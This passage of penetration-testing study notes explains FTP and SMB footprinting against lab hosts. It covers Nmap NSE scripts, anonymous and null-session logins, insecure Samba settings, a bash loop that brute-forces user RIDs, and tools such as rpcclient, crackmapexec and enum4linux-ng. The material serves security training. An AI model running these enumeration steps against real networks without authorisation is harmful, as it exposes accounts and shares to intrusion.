Notice everything shows "ftp ftp" as owner and group instead of real values like "1002 1002".

> **Counter-defense note:** Modern systems use fail2ban to detect and block brute force attempts. If too many failed login attempts come from one IP, that IP gets automatically blocked. So even if you discover real usernames through FTP, brute forcing those accounts from the same IP would quickly get blocked.

---

### Footprinting FTP with Nmap

#### What is Nmap NSE?

Nmap includes the Nmap Scripting Engine (NSE) — a collection of scripts written in Lua that can perform specific enumeration, detection, and even exploitation tasks against target services. For FTP, there are several NSE scripts that automatically check for common vulnerabilities and misconfigurations.

#### Updating the NSE Script Database

```bash
sudo nmap --script-updatedb
```

**Purpose:** Updates the local NSE script database so Nmap knows about all available scripts. You should run this periodically to get the latest scripts.

Example output:

```
Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-19 13:49 CEST
NSE: Updating rule database.
NSE: Script Database updated successfully.
Nmap done: 0 IP addresses (0 hosts up) scanned in 0.28 seconds
```

#### Finding FTP-Related NSE Scripts

```bash
find / -type f -name ftp* 2>/dev/null | grep scripts
```

**Purpose:** Searches the entire filesystem for files whose names start with "ftp" and filters results to show only those in a "scripts" directory. The `2>/dev/null` redirects error messages (like "permission denied") to null so they don''t clutter the output.

Example output:

```
/usr/share/nmap/scripts/ftp-syst.nse
/usr/share/nmap/scripts/ftp-vsftpd-backdoor.nse
/usr/share/nmap/scripts/ftp-vuln-cve2010-4221.nse
/usr/share/nmap/scripts/ftp-proftpd-backdoor.nse
/usr/share/nmap/scripts/ftp-bounce.nse
/usr/share/nmap/scripts/ftp-libopie.nse
/usr/share/nmap/scripts/ftp-anon.nse
/usr/share/nmap/scripts/ftp-brute.nse
```

What each script does:

| Script | Purpose |
|---|---|
| `ftp-anon.nse` | Checks if the FTP server allows anonymous login. If it does, the script logs in anonymously and lists the root FTP directory contents. |
| `ftp-syst.nse` | Sends the STAT command to the FTP server to get detailed status information. Reveals the FTP server type, version, session settings, connection count, and timeout values. |
| `ftp-brute.nse` | Attempts to brute force FTP credentials using a username and password list. Used when you know the service requires authentication. |
| `ftp-vsftpd-backdoor.nse` | Checks for the famous backdoor planted in vsFTPd version 2.3.4 in 2011. If this backdoor exists, connecting to port 6200 gives a root shell. |
| `ftp-proftpd-backdoor.nse` | Similar to above but for ProFTPd server backdoors. |
| `ftp-bounce.nse` | Tests if the FTP server is vulnerable to FTP bounce attacks, where you use the server as a proxy to scan other machines. |
| `ftp-vuln-cve2010-4221.nse` | Checks for a specific buffer overflow vulnerability in ProFTPd. |
| `ftp-libopie.nse` | Tests for OTP (One-Time Password) issues in FTP implementations. |

#### Full Nmap FTP Scan

```bash
sudo nmap -sV -p21 -sC -A 10.129.14.136
```

Breaking down every flag:

- `sudo` — Run as root (needed for certain scan types)
- `nmap` — The tool name
- `-sV` — Service version detection. Nmap probes the service to determine the exact software and version running
- `-p21` — Only scan port 21 (FTP port). Without this flag, Nmap scans many ports which takes longer
- `-sC` — Run default scripts. This automatically runs all scripts in Nmap''s "default" category for any service detected
- `-A` — Aggressive scan mode. Enables OS detection, version detection, script scanning, and traceroute all together
- `10.129.14.136` — The target IP address

Example output:

```
Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-16 18:12 CEST
Nmap scan report for 10.129.14.136
Host is up (0.00013s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rwxrwxrwx    1 ftp      ftp       8138592 Sep 16 17:24 Calendar.pptx [NSE: writeable]
| drwxrwxrwx    4 ftp      ftp          4096 Sep 16 17:57 Clients [NSE: writeable]
| drwxrwxrwx    2 ftp      ftp          4096 Sep 16 18:05 Documents [NSE: writeable]
| drwxrwxrwx    2 ftp      ftp          4096 Sep 16 17:24 Employees [NSE: writeable]
| -rwxrwxrwx    1 ftp      ftp            41 Sep 16 17:24 Important Notes.txt [NSE: writeable]
|_-rwxrwxrwx    1 ftp      ftp             0 Sep 15 14:57 testupload.txt [NSE: writeable]
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 10.10.14.4
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
```

What this output tells you: The `ftp-anon` script confirmed anonymous FTP login is allowed. It logged in and listed the root directory. Every file shows `[NSE: writeable]` meaning they can be modified — a serious finding. The `ftp-syst` script learned the exact vsFTPd version (3.0.3), that all connections are plain text (no encryption), the session timeout is 300 seconds, and there are 2 current client connections.

#### Nmap Script Trace

```bash
sudo nmap -sV -p21 -sC -A 10.129.14.136 --script-trace
```

**Purpose:** Adds `--script-trace` to the normal scan. This makes Nmap show EVERY network interaction that happens during the NSE script execution. You can see all the raw data being sent and received at the network level.

Example output showing key parts:

```
NSOCK INFO [11.4640s] nsock_connect_tcp(): TCP connection requested to 10.129.14.136:21
NSOCK INFO [11.4640s] nsock_trace_handler_callback(): Callback: CONNECT SUCCESS for EID 8
NSOCK INFO [11.4660s] nsock_trace_handler_callback(): Callback: READ SUCCESS for EID 50
(41 bytes): 220 Welcome to HTB-Academy FTP service...

NSE: TCP 10.10.14.4:54228 < 10.129.14.136:21 | 220 Welcome to HTB-Academy FTP service.
```

You can see the exact timestamp of each event, the exact bytes received, and the raw server banner. Notice that Nmap opens multiple parallel connections using different local ports to run multiple scripts simultaneously.

---

### Service Interaction — Direct Connection to FTP

#### Connecting with Netcat

```bash
nc -nv 10.129.14.136 21
```

**Purpose:** Opens a raw TCP connection to the FTP server on port 21 using netcat. This bypasses all FTP client features and lets you communicate with the server directly using raw text commands.

- `-n` — Do not resolve hostnames (use IP directly, faster)
- `-v` — Verbose mode (shows connection status messages)
- `10.129.14.136` — Target IP
- `21` — Target port

After connecting, you see the server banner and can type FTP commands manually. This is useful when you want minimal footprint and maximum control over exactly what gets sent.

#### Connecting with Telnet

```bash
telnet 10.129.14.136 21
```

**Purpose:** Similar to netcat — opens a plain text connection to the FTP server. Telnet was originally used for terminal access but can connect to any TCP service. It gives you direct text-based interaction with the FTP server protocol. Both netcat and telnet are useful when you want to manually test specific FTP commands or check what the server responds to.

---

### FTP with TLS/SSL Encryption — Using OpenSSL

#### When is This Needed?

Some FTP servers are configured with TLS/SSL encryption (called FTPS). Standard FTP clients and netcat/telnet cannot handle encrypted connections. You need a tool that understands SSL/TLS to connect. OpenSSL''s `s_client` tool can do this.

```bash
openssl s_client -connect 10.129.14.136:21 -starttls ftp
```

Breaking down the command:

- `openssl` — The OpenSSL toolkit
- `s_client` — The SSL/TLS client component of OpenSSL
- `-connect 10.129.14.136:21` — Connect to this IP and port
- `-starttls ftp` — This is very important. It tells openssl to first connect in plain text, then send the FTP STARTTLS command to upgrade to an encrypted connection. This is how FTPS (explicit mode) works.

What the output reveals:

```
CONNECTED(00000003)
Can''t use SSL_get_servername
depth=0 C = US, ST = California, L = Sacramento, O = Inlanefreight, OU = Dev,
CN = master.inlanefreight.htb, emailAddress = admin@inlanefreight.htb
verify error:num=18:self signed certificate
verify return:1
```

The SSL certificate in the output tells you extremely valuable information:

- `C = US, ST = California, L = Sacramento` — Country, state, and city of the organization
- `O = Inlanefreight` — Organization name
- `OU = Dev` — Organizational unit (department) — this is the Dev team''s certificate
- `CN = master.inlanefreight.htb` — The Common Name, which is the hostname of the server
- `emailAddress = admin@inlanefreight.htb` — The admin''s email address

The error "self signed certificate" means the certificate was not issued by a trusted Certificate Authority but was created by the organization itself. This is common in internal environments. It does not prevent the connection — it just means you cannot automatically verify the server''s identity.

> **Why this is useful for penetration testing:** Even without breaking the encryption, the certificate itself leaks the server''s hostname, the organization name, department, admin email, and in some cases even geographic location. This is all valuable intelligence gathered passively.

---

## Section 6: SMB (Server Message Block)

### What is SMB?

SMB (Server Message Block) is a client-server network protocol that controls and manages access to shared resources across a network. These shared resources include files, entire directories, printers, routers, and other network interfaces. SMB was originally developed for Windows operating systems and first became widely available as part of the OS/2 network operating system LAN Manager and LAN Server. Beyond file sharing, SMB also handles communication between different system processes, meaning applications on different machines can exchange data using SMB. Today SMB is used in almost every Windows-based network environment, and because of backward compatibility, newer Windows versions can still communicate with very old Windows systems over SMB. This makes SMB both very widespread and a major target for penetration testers.

---

### How SMB Works

SMB works on the client-server model. The client sends a request to access a resource, and the server processes that request and either grants or denies access. Before any data is exchanged, both parties must establish a connection. In IP networks, SMB uses TCP protocol for this, which means a proper three-way handshake (SYN, SYN-ACK, ACK) happens before the session begins. After the connection is established, TCP governs all data transport. The SMB server can share parts of its local file system as "shares" — these shares appear to the client as accessible network folders. Access rights to these shares are controlled by ACLs (Access Control Lists), which can be set very specifically per user or per group with granular permissions like read-only, write, or full access.

---

### Samba — SMB for Linux

Samba is the open-source Linux/Unix implementation of the SMB protocol. It allows Linux and Unix systems to participate in Windows networks and share files with Windows machines. Samba implements CIFS (Common Internet File System), which is a specific dialect of SMB version 1 originally created by Microsoft. Modern Samba supports SMB 2 and SMB 3 as well. Samba uses two important background services: `smbd` (SMB server daemon) which provides file and print services, and `nmbd` (NetBIOS Message Block Daemon) which handles NetBIOS name resolution. When Samba communicates with older NetBIOS services, it uses TCP ports 137, 138, and 139. Modern CIFS and SMB use TCP port 445 exclusively.

---

### SMB Version History

Understanding SMB versions is important because older versions have serious known vulnerabilities (like EternalBlue which targeted SMB 1.0):

| Version | Notes |
|---|---|
| CIFS (Windows NT 4.0) | The very first version. Communication happens through the NetBIOS interface. Considered completely outdated and insecure today. |
| SMB 1.0 (Windows 2000) | Introduced direct TCP connection without NetBIOS. Still has major security flaws. The EternalBlue exploit (used in WannaCry ransomware) targeted this version. |
| SMB 2.0 (Windows Vista, Server 2008) | Major improvements including better performance, improved message signing to detect tampering, and caching features to speed up repeated requests. |
| SMB 2.1 (Windows 7, Server 2008 R2) | Added file locking mechanisms to prevent conflicts when multiple users access the same file simultaneously. |
| SMB 3.0 (Windows 8, Server 2012) | Added multichannel connections (multiple network paths for resilience), end-to-end encryption, and remote storage access. |
| SMB 3.0.2 (Windows 8.1, Server 2012 R2) | Minor updates and bug fixes. |
| SMB 3.1.1 (Windows 10, Server 2016) | Added integrity checking before authentication and AES-128 encryption for maximum security. |

With Samba version 3, the Linux Samba server could join a Windows Active Directory domain as a member. With version 4, Samba can even act as a full Active Directory domain controller.

---

### Default Samba Configuration

#### How to View Samba Configuration

```bash
cat /etc/samba/smb.conf | grep -v "#\|\;"
```

**Purpose:** Reads the main Samba configuration file and filters out all comment lines. The `grep -v "#\|\;"` part means "exclude lines containing `#` OR `;`". Both characters are used for comments in smb.conf. This gives you only the active configuration lines.

Example output:

```
[global]
   workgroup = DEV.INFREIGHT.HTB
   server string = DEVSMB
   log file = /var/log/samba/log.%m
   max log size = 1000
   logging = file
   panic action = /usr/share/samba/panic-action %d
   server role = standalone server
   obey pam restrictions = yes
   unix password sync = yes
   passwd program = /usr/bin/passwd %u
   pam password change = yes
   map to guest = bad user
   usershare allow guests = yes

[printers]
   comment = All Printers
   browseable = no
   path = /var/spool/samba
   printable = yes
   guest ok = no
   read only = yes
   create mask = 0700

[print$]
   comment = Printer Drivers
   path = /var/lib/samba/printers
   browseable = yes
   read only = yes
   guest ok = no
```

Understanding the configuration structure: The `[global]` section applies settings to all shares. `workgroup` sets the Windows workgroup or domain name. `server string` is what appears when clients browse the network. `server role = standalone server` means this Samba server is not a domain member — it operates independently. `map to guest = bad user` means failed logins are treated as guest access (this can be dangerous). `usershare allow guests = yes` allows guest access to user-created shares.

#### Key SMB Share Settings and What They Mean

| Setting | Description |
|---|---|
| `[sharename]` | The name in square brackets defines the share name. This is what clients see when they browse the network. |
| `workgroup = WORKGROUP/DOMAIN` | Defines which Windows workgroup or domain this server belongs to. |
| `path = /path/here/` | The actual directory on the Linux filesystem that this share maps to. |
| `server string = STRING` | A description of the server that appears to clients when they connect. |
| `unix password sync = yes` | Synchronizes the Unix/Linux password with the SMB password so users only need one password. |
| `usershare allow guests = yes` | Allows non-authenticated (guest) users to access shares configured for guest access. |
| `map to guest = bad user` | When a login fails because the username does not exist, the connection is treated as a guest instead of being rejected. |
| `browseable = yes` | Makes the share visible in network browsing lists. If set to no, the share is hidden and can only be accessed if you know its exact name. |
| `guest ok = yes` | Allows connection to this specific share without any password. Anyone can access it anonymously. |
| `read only = yes` | Users can only read files. They cannot create, modify, or delete anything. Set to no to allow modifications. |
| `create mask = 0700` | When new files are created through SMB, they get these Unix permissions. 0700 means only the owner can read, write, execute. |

---

### Dangerous SMB Settings

| Setting | Risk |
|---|---|
| `browseable = yes` | Makes shares visible to everyone scanning the network. An attacker can see what shares exist without any authentication. |
| `read only = no` | Combined with guest access, this allows anonymous users to upload files, modify data, or potentially replace legitimate files with malicious ones. |
| `writable = yes` | Same as read only = no but explicitly enables write access. |
| `guest ok = yes` | No password required. This is the single most dangerous SMB setting because it allows complete unauthenticated access to the share. |
| `enable privileges = yes` | Honors Windows-style SID (Security Identifier) privileges, which can allow privilege escalation within the SMB context. |
| `create mask = 0777` | New files created through SMB get full permissions for everyone — any user on the Linux system can read, write, and execute them. |
| `directory mask = 0777` | New directories created through SMB get full permissions for everyone. |
| `logon script = script.sh` | Executes a shell script every time a user logs on. If an attacker controls this script, they can execute arbitrary commands on every user login. |
| `magic script = script.sh` | Executes when a specific script file is closed. This is a very dangerous setting that can lead to automatic command execution. |
| `magic output = script.out` | Specifies where the output of the magic script is stored. |

#### Creating an Example Share for Testing

Configuration to add to `/etc/samba/smb.conf`:

```
[notes]
    comment = CheckIT
    path = /mnt/notes/
    browseable = yes
    read only = no
    writable = yes
    guest ok = yes
    enable privileges = yes
    create mask = 0777
    directory mask = 0777
```

This creates a share called "notes" that maps to `/mnt/notes/`, is visible in network browsing, allows read and write access, allows guests without passwords, and gives full permissions to all created files. This is an extremely insecure configuration used here for demonstration purposes.

---

### Restarting Samba to Apply Configuration Changes

```bash
sudo systemctl restart smbd
```

**Purpose:** After modifying `/etc/samba/smb.conf`, you must restart the Samba service for changes to take effect. `systemctl` is the service management tool on modern Linux systems. `restart` stops the service and then starts it again. Without restarting, the old configuration remains active.

---

### Performing SMB Tasks

#### SMBclient — Listing Available Shares

```bash
smbclient -N -L //10.129.14.128
```

**Purpose:** Lists all shared folders available on the target Samba server without using any credentials.

Breaking down the flags:

- `smbclient` — The SMB client tool
- `-N` — Null session, meaning no password is used. This is anonymous access
- `-L` — List mode. Shows all available shares instead of connecting to one
- `//10.129.14.128` — The target server in UNC path format (double slash + IP)

Example output:

```
        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        home            Disk      INFREIGHT Samba
        dev             Disk      DEVenv
        notes           Disk      CheckIT
        IPC$            IPC       IPC Service (DEVSM)
SMB1 disabled -- no workgroup available
```

You can see five shares. `print$` and `IPC$` are default shares always present. `home`, `dev`, and `notes` are custom shares. The Type column shows "Disk" for file shares and "IPC" for inter-process communication. The Comment column shows the description set in smb.conf.

#### SMBclient — Connecting to a Specific Share

```bash
smbclient //10.129.14.128/notes
```

**Purpose:** Connects to the specific "notes" share on the target server. You are prompted for a password — pressing Enter attempts anonymous/guest access.

Full interaction example:

```
Enter WORKGROUP\<username>''s password:
Anonymous login successful
Try "help" to get a list of possible commands.

smb: \>
```

The `smb: \>` prompt means you are inside the share and can now navigate and interact with its contents.

#### help — List Available SMB Commands

```
smb: \> help
```

**Purpose:** Displays all commands available inside the SMB session.

Example output (partial):

```
?              allinfo        altname        archive        backup
blocksize      cancel         case_sensitive cd             chmod
chown          close          del            deltree        dir
du             echo           exit           get            getfacl
help           history        iosize         lcd            link
lock           lowercase      ls             l              mask
md             mget           mkdir          more           mput
newer          notify         open           posix          print
prompt         put            pwd            q              queue
quit           readlink       rd             recurse        reget
rename         reput          rm             rmdir          showacls
setea          setmode        scopy          stat           symlink
tar            tarmode        timeout        translate      unlock
volume         vuid           wdel           logon          listconnect
showconnect    tcon           tdis           tid            utimes
logoff         ..             !
```

Key commands: `ls` (list files), `get` (download file), `put` (upload file), `cd` (change directory), `mkdir` (make directory), `rm` (delete file), `!` (run local command).

#### ls — List Files in SMB Share

```
smb: \> ls
```

**Purpose:** Lists all files and directories in the current SMB share directory. Shows permissions, size, and last modified date.

Example output:

```
  .                                   D        0  Wed Sep 22 18:17:51 2021
  ..                                  D        0  Wed Sep 22 12:03:59 2021
  prep-prod.txt                       N       71  Sun Sep 19 15:45:21 2021

                30313412 blocks of size 1024. 16480084 blocks available
```

The `D` flag means directory. `N` means normal file. The number after is the file size in bytes. The last line shows available disk space on the share.

#### get — Download a File from SMB Share

```
smb: \> get prep-prod.txt
```

**Purpose:** Downloads the specified file from the SMB share to your local machine.

Example output:

```
getting file \prep-prod.txt of size 71 as prep-prod.txt (8,7 KiloBytes/sec) (average 8,7 KiloBytes/sec)
```

#### ! — Run Local Commands Without Leaving SMB Session

```
smb: \> !ls
smb: \> !cat prep-prod.txt
```

**Purpose:** The exclamation mark prefix runs commands on your LOCAL machine without disconnecting from the SMB session. `!ls` lists your local directory, `!cat prep-prod.txt` reads the file you just downloaded. This is very convenient during a penetration test because you can download and immediately inspect files without leaving the SMB session.

Example interaction:

```
smb: \> !ls
prep-prod.txt

smb: \> !cat prep-prod.txt
[] check your code with the templates
[] run code-assessment.py
[] ...
```

#### smbstatus — Check Active SMB Connections (Server Side)

```bash
root@samba:~# smbstatus
```

**Purpose:** Run on the Samba server itself (requires root), this command shows all currently active SMB connections. It reveals who is connected, from which IP address, which share they are accessing, which SMB protocol version they are using, and whether encryption and signing are active.

Example output:

```
Samba version 4.11.6-Ubuntu
PID     Username     Group        Machine                          Protocol Version  Encryption  Signing
------------------------------------------------------------------------
75691   sambauser    samba        10.10.14.4 (ipv4:10.10.14.4:45564)  SMB3_11    -           -

Service      pid     Machine       Connected at                     Encryption   Signing
---------------------------------------------------------------------------------------------
notes        75691   10.10.14.4   Do Sep 23 00:12:06 2021 CEST     -            -

No locked files
```

This shows user "sambauser" connected from 10.10.14.4, is accessing the "notes" share, and is using SMB3_11 (SMB 3.1.1). The `-` under Encryption and Signing means neither is active — a finding worth noting.

---

### Footprinting SMB with Nmap

```bash
sudo nmap 10.129.14.128 -sV -sC -p139,445
```

**Purpose:** Scans the two SMB-related ports. Port 139 is for NetBIOS session service (older SMB), port 445 is for modern SMB over TCP directly. The `-sV` detects versions, `-sC` runs default scripts.

Example output:

```
PORT    STATE SERVICE     VERSION
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2

Host script results:
|_nbstat: NetBIOS name: HTB, NetBIOS user: <unknown>
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2021-09-19T13:16:04
|_  start_date: N/A
```

The output shows Samba version 4.6.2. Message signing is enabled but NOT required — meaning signing can be bypassed, which opens the server to relay attacks.

---

### RPCclient — Manual SMB Enumeration

#### What is RPC?

RPC (Remote Procedure Call) is a technology that allows a program on one computer to execute functions or procedures on another computer as if they were local. In the Windows/Samba world, RPC is used to query all kinds of information from servers. The `rpcclient` tool implements MS-RPC functions for Linux.

#### Connecting with RPCclient

```bash
rpcclient -U "" 10.129.14.128
```

**Purpose:** Connects to the SMB server using an empty username and no password (null session / anonymous access). The `-U ""` specifies an empty username. If the server allows null sessions, you get the `rpcclient $>` prompt.

Example:

```
Enter WORKGROUP\''s password:
rpcclient $>
```

Just press Enter when asked for the password. Success means null sessions are allowed — a security misconfiguration.

#### srvinfo — Get Server Information

```
rpcclient $> srvinfo
```

**Purpose:** Retrieves basic server information including the server name, OS version, and server type flags.

Example output:

```
DEVSMB         Wk Sv PrQ Unx NT SNT DEVSM
platform_id     :       500
os version      :       6.1
server type     :       0x809a03
```

The OS version `6.1` corresponds to Windows 7 / Windows Server 2008 R2. The server type flags tell you what roles the server is performing (workstation, server, print queue server, Unix machine, etc.).

#### enumdomains — List All Domains

```
rpcclient $> enumdomains
```

**Purpose:** Lists all Windows domains that are deployed and visible in the network.

Example output:

```
name:[DEVSMB] idx:[0x0]
name:[Builtin] idx:[0x1]
```

Shows the main domain (DEVSMB) and the built-in domain (which contains built-in groups like Administrators and Users).

#### querydominfo — Get Domain Information

```
rpcclient $> querydominfo
```

**Purpose:** Retrieves detailed information about the domain including the domain name, server name, total users, total groups, and domain server role.

Example output:

```
Domain:         DEVOPS
Server:         DEVSMB
Comment:        DEVSM
Total Users:    2
Total Groups:   0
Total Aliases:  0
Sequence No:    1632361158
Force Logoff:   -1
Domain Server State:    0x1
Server Role:    ROLE_DOMAIN_PDC
Unknown 3:      0x1
```

This reveals the domain is called "DEVOPS", there are 2 users, and this server is the Primary Domain Controller (PDC). Very valuable information for understanding the network structure.

#### netshareenumall — List All Shares with Paths

```
rpcclient $> netshareenumall
```

**Purpose:** Enumerates ALL available shares on the server, showing share names, descriptions, and most importantly — the actual filesystem paths on the server. This is more detailed than just listing share names.

Example output:

```
netname: print$
        remark: Printer Drivers
        path:   C:\var\lib\samba\printers
        password:
netname: home
        remark: INFREIGHT Samba
        path:   C:\home\
        password:
netname: dev
        remark: DEVenv
        path:   C:\home\sambauser\dev\
        password:
netname: notes
        remark: CheckIT
        path:   C:\mnt\notes\
        password:
netname: IPC$
        remark: IPC Service (DEVSM)
        path:   C:\tmp
        password:
```

Now you know the real filesystem paths behind each share. For example, the "home" share maps to `/home/` on the server, and "notes" maps to `/mnt/notes/`. This helps you understand the server''s directory structure.

#### netsharegetinfo — Detailed Info About a Specific Share

```
rpcclient $> netsharegetinfo notes
```

**Purpose:** Gets very detailed information about a specific share including its path, permissions, maximum concurrent users, and the full ACL (Access Control List) in security descriptor format.

Example output:

```
netname: notes
        remark: CheckIT
        path:   C:\mnt\notes\
        password:
        type:   0x0
        perms:  0
        max_uses:       -1
        num_uses:       1
revision: 1
type: 0x8004: SEC_DESC_DACL_PRESENT SEC_DESC_SELF_RELATIVE
DACL
        ACL     Num ACEs:       1       revision:       2
        ---
        ACE
                type: ACCESS ALLOWED (0) flags: 0x00
                Specific bits: 0x1ff
                Permissions: 0x101f01ff: Generic all access SYNCHRONIZE_ACCESS
                WRITE_OWNER_ACCESS WRITE_DAC_ACCESS READ_CONTROL_ACCESS DELETE_ACCESS
                SID: S-1-1-0
```

The SID `S-1-1-0` is the "Everyone" group — meaning ALL users (including anonymous) have full generic access to this share. `max_uses` of `-1` means unlimited simultaneous connections.

#### enumdomusers — List All Domain Users

```
rpcclient $> enumdomusers
```

**Purpose:** Lists all user accounts on the domain or server, along with their RID (Relative Identifier).

Example output:

```
user:[mrb3n] rid:[0x3e8]
user:[cry0l1t3] rid:[0x3e9]
```

This reveals two users: "mrb3n" with RID 0x3e8 (1000 in decimal) and "cry0l1t3" with RID 0x3e9 (1001 in decimal). These usernames can then be used for targeted brute force attacks.

#### queryuser — Get Detailed User Information by RID

```
rpcclient $> queryuser 0x3e9
```

**Purpose:** Retrieves complete details about a specific user identified by their RID. This reveals the full username, home directory path, profile path, last logon time, password last set time, account flags, and more.

Example output:

```
User Name   :   cry0l1t3
Full Name   :   cry0l1t3
Home Drive  :   \\devsmb\cry0l1t3
Dir Drive   :
Profile Path:   \\devsmb\cry0l1t3\profile
Logon Script:
Description :
Workstations:
Comment     :
Remote Dial :
Logon Time               :      Do, 01 Jan 1970 01:00:00 CET
Logoff Time              :      Mi, 06 Feb 2036 16:06:39 CET
Kickoff Time             :      Mi, 06 Feb 2036 16:06:39 CET
Password last set Time   :      Mi, 22 Sep 2021 17:50:56 CEST
Password can change Time :      Mi, 22 Sep 2021 17:50:56 CEST
Password must change Time:      Do, 14 Sep 30828 04:48:05 CEST
user_rid :      0x3e9
group_rid:      0x201
acb_info :      0x00000014
bad_password_count:     0x00000000
logon_count:    0x00000000
```

#### querygroup — Get Group Information

```
rpcclient $> querygroup 0x201
```

**Purpose:** Retrieves information about a specific group identified by its RID.

Example output:

```
Group Name:     None
Description:    Ordinary Users
Group Attribute:7
Num Members:2
```

Group 0x201 is the standard user group "None" (equivalent to Domain Users) with 2 members — the same 2 users found earlier.

---

### Brute Forcing User RIDs with RPCclient

#### Why Brute Force RIDs?

Windows and Samba assign RIDs to users and groups sequentially starting from 500 for built-in accounts and 1000+ for regular accounts. By querying each RID in sequence, you can discover ALL users on the system even if `enumdomusers` is restricted.

```bash
for i in $(seq 500 1100); do rpcclient -N -U "" 10.129.14.128 -c "queryuser 0x$(printf ''%x\n'' $i)" | grep "User Name\|user_rid\|group_rid" && echo ""; done
```

**Purpose:** This bash loop goes through numbers 500 to 1100, converts each to hexadecimal using `printf ''%x\n''`, then sends a `queryuser` RPC command for each one. If a user with that RID exists, it prints the username and group information.

Example output:

```
        User Name   :   sambauser
        user_rid :      0x1f5
        group_rid:      0x201

        User Name   :   mrb3n
        user_rid :      0x3e8
        group_rid:      0x201

        User Name   :   cry0l1t3
        user_rid :      0x3e9
        group_rid:      0x201
```

Three users discovered. Sambauser has RID 0x1f5 (501 decimal — a built-in account), while mrb3n and cry0l1t3 are regular users starting at 1000.

---

### Impacket samrdump.py — Automated User Enumeration

```bash
samrdump.py 10.129.14.128
```

**Purpose:** A Python script from the Impacket toolkit that automatically connects to the SAM (Security Account Manager) database over SMB and enumerates all users. It provides much more detail than manual RID brute forcing.

Example output:

```
[*] Retrieving endpoint list from 10.129.14.128
Found domain(s):
 . DEVSMB
 . Builtin
[*] Looking up users in domain DEVSMB
Found user: mrb3n, uid = 1000
Found user: cry0l1t3, uid = 1001
mrb3n (1000)/FullName:
mrb3n (1000)/UserComment:
mrb3n (1000)/PrimaryGroupId: 513
mrb3n (1000)/BadPasswordCount: 0
mrb3n (1000)/LogonCount: 0
mrb3n (1000)/PasswordLastSet: 2021-09-22 17:47:59
mrb3n (1000)/PasswordDoesNotExpire: False
mrb3n (1000)/AccountIsDisabled: False
cry0l1t3 (1001)/FullName: cry0l1t3
cry0l1t3 (1001)/PasswordLastSet: 2021-09-22 17:50:56
cry0l1t3 (1001)/PasswordDoesNotExpire: False
cry0l1t3 (1001)/AccountIsDisabled: False
[*] Received 2 entries.
```

---

### SMBmap — Check Share Permissions Quickly

```bash
smbmap -H 10.129.14.128
```

**Purpose:** Connects to the SMB server and quickly shows all available shares along with the exact permissions your current user has on each one (READ, WRITE, or NO ACCESS). The `-H` flag specifies the host IP address.

Example output:

```
[+] Finding open SMB ports....
[+] User SMB session established on 10.129.14.128...
[+] IP: 10.129.14.128:445       Name: 10.129.14.128
        Disk                          Permissions     Comment
        ----                          -----------     -------
        print$                        NO ACCESS       Printer Drivers
        home                          NO ACCESS       INFREIGHT Samba
        dev                           NO ACCESS       DEVenv
        notes                         NO ACCESS       CheckIT
        IPC$                          NO ACCESS       IPC Service (DEVSM)
```

---

### CrackMapExec — SMB Enumeration with Credentials

```bash
crackmapexec smb 10.129.14.128 --shares -u '''' -p ''''
```

**Purpose:** CrackMapExec (CME) is a powerful post-exploitation tool for SMB enumeration. This command connects with empty username and password (anonymous) and lists all shares with their permissions. Unlike SMBmap, CME also shows the Windows version, hostname, SMB signing status, and whether SMBv1 is enabled.

Example output:

```
SMB  10.129.14.128  445  DEVSMB  [*] Windows 6.1 Build 0 (name:DEVSMB) (domain:) (signing:False) (SMBv1:False)
SMB  10.129.14.128  445  DEVSMB  [+] \:
SMB  10.129.14.128  445  DEVSMB  [+] Enumerated shares
SMB  10.129.14.128  445  DEVSMB  Share           Permissions     Remark
SMB  10.129.14.128  445  DEVSMB  -----           -----------     ------
SMB  10.129.14.128  445  DEVSMB  print$                          Printer Drivers
SMB  10.129.14.128  445  DEVSMB  home                            INFREIGHT Samba
SMB  10.129.14.128  445  DEVSMB  dev                             DEVenv
SMB  10.129.14.128  445  DEVSMB  notes           READ,WRITE      CheckIT
SMB  10.129.14.128  445  DEVSMB  IPC$                            IPC Service (DEVSM)
```

> **Critical finding:** `signing:False` means SMB signing is not required — this allows relay attacks. `SMBv1:False` is good — SMBv1 is disabled. The "notes" share has `READ,WRITE` access for anonymous users — a major vulnerability.

---

### Enum4Linux-ng — Complete Automated SMB Enumeration

#### Installation

```bash
git clone https://github.com/cddmp/enum4linux-ng.git
cd enum4linux-ng
pip3 install -r requirements.txt
```

**Purpose:** Clones the enum4linux-ng repository from GitHub, enters the directory, and installs all required Python dependencies. Enum4linux-ng is the modern rewrite of the older enum4linux tool. It automates all SMB enumeration tasks including LDAP checks, SMB dialect detection, NetBIOS information, OS detection, user enumeration, group enumeration, share enumeration, policy enumeration, and printer enumeration.

#### Running Full Enumeration

```bash
./enum4linux-ng.py 10.129.14.128 -A
```

**Purpose:** Runs ALL enumeration modules against the target. The `-A` flag means "All" — it enables every available check. This is the most comprehensive SMB enumeration you can do with a single command.

Key sections of the output explained:

Service Scan:
```
[*] Checking LDAP — [-] Could not connect (not a domain controller)
[*] Checking SMB — [+] SMB is accessible on 445/tcp
[*] Checking SMB over NetBIOS — [+] accessible on 139/tcp
```

NetBIOS Information:
```
[+] Got domain/workgroup name: DEVOPS
[+] Full NetBIOS names information:
- DEVSMB <00> - Workstation Service
- DEVSMB <20> - File Server Service
- DEVOPS <00> - Domain/Workgroup Name
- DEVOPS <1d> - Master Browser
```

SMB Dialect Check:
```
SMB 1.0: false
SMB 2.02: true
SMB 2.1: true
SMB 3.0: true
Preferred dialect: SMB 3.0
SMB signing required: false
```

RPC Session Check:
```
[+] Server allows session using username '''', password ''''
[+] Server allows session using username ''juzgtcsu'', password ''''
```

The second line means the server allows ANY random username with no password — very insecure.

Users:
```
''1000'':
  username: mrb3n
  acb: ''0x00000010''
''1001'':
  username: cry0l1t3
  acb: ''0x00000014''
```

Password Policy:
```
domain_password_information:
  min_pw_length: 5
  DOMAIN_PASSWORD_COMPLEX: false
```

